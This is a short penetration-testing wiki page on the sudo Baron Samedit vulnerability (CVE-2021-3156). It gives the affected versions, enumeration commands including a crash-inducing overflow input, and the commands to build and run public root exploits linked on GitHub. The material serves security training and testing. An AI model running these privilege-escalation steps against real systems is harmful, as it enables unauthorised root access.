---
description: CVE-2021–3156
---

# Baron Samedit

## Theory

The "Sudo Baro Samedit" is heap buffer overflow exploit allowing any user to escalate privileges to root. No misconfigurations required, this exploit works with the default settings, for any user regardless of Sudo permissions.

The vulnerability was patched, but it didn’t update the version number for sudo or any other binary. So it’s not possible to tell definitively if a version if vulnerable or not just by version number.It can affects any unpatched version of the sudo program from **1.8.2–1.8.31p2** and **1.9.0–1.9.5p1**

## Practice

{% tabs %}
{% tab title="Enumeration" %}
To check the exploitability of sudo, you may run the following commands. If it's returns the `sudoedit: /: not a regular file` error message, then it’s vulnerable. If it returns the sudoedit usage, it’s not.

```bash
sudoedit -s /
```

Or with the following command, if the system is vulnerable it will overwrite the heap buffer and crash the process:

```bash
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
```
{% endtab %}

{% tab title="Exploit" %}
We can use the [Sudo Baron Samedit Exploit](https://github.com/worawit/CVE-2021-3156) made by worawit. For Linux distributions that glibc has tcache support and enabled (CentOS 8, Ubuntu >= 17.10, Debian 10) we can use exploit\_nss.py:

```bash
python3 exploit_nss.py
```

For Linux distribution that glibc has no tcache support:

```
python exploit_nss_xxx.py #for specific version
python exploit_userspec.py #Last try
```

Alternativly, we may use the [Sudo Baron Samedit Exploit](https://github.com/blasty/CVE-2021-3156) made by blasty (Ubuntu 18.04.5, Ubuntu 20.04.1, Debian 10.0)\
On the vulnerable host we can do:

```
# Make file from source
make

# Replace 0 by your OS target
./sudo-hax-me-a-sandwich 0 

```
{% endtab %}
{% endtabs %}

### References

{% embed url="https://datafarm-cybersecurity.medium.com/exploit-writeup-for-cve-2021-3156-sudo-baron-samedit-7a9a4282cb31" %}
